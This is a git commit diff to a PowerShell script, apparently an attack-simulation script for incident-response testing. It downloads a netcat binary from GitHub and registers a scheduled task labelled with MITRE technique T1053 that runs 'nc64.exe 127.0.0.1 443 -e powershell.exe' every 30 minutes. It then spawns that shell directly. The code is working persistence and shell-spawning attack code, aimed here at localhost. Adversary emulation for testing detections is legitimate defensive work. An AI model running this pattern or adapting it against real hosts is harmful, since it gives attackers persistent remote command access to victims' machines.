0247b78d04a19a7bc5df75578e08118a79f4f0e8
IArandom <76522240+IArandom@users.noreply.github.com>
2021-01-05 14:46:25 -0400

    Update spawn.ps1

--- spawn.ps1
+++ spawn.ps1
@@ -10,15 +10,21 @@ if (-not (Test-Path -LiteralPath $DirectoryToCreate)) {
     catch {
         Write-Error -Message "Unable to create directory '$DirectoryToCreate'. Error was: $_" -ErrorAction Stop
     }
-    #   Download nc onto the directory
-    iwr -uri https://github.com/IArandom/check/raw/main/nc64.exe -outfile c:\soft\nc64.exe
+
 
 }
 else {
     "Directory already existed"
-    #   Download nc onto the directory
-    iwr -uri https://github.com/IArandom/check/raw/main/nc64.exe -outfile c:\soft\nc64.exe
 }
 
+#   Download nc onto the directory
+Invoke-WebRequest -uri https://github.com/IArandom/check/raw/main/nc64.exe -outfile c:\soft\nc64.exe
+
+#   T1053
+#   Create a Scheduled Task that will spawn a shell each 30m
+SCHTASKS /Create /SC MINUTE /TN "Incident Testing" /TR "C:\soft\nc64.exe 127.0.0.1 443 -e powershell.exe" /mo 30
+SCHTASKS /Run /TN "Incident Testing"  
+
+#   T1086
 #   Spawn the shell
 C:\soft\nc64.exe 127.0.0.1 443 -e powershell.exe
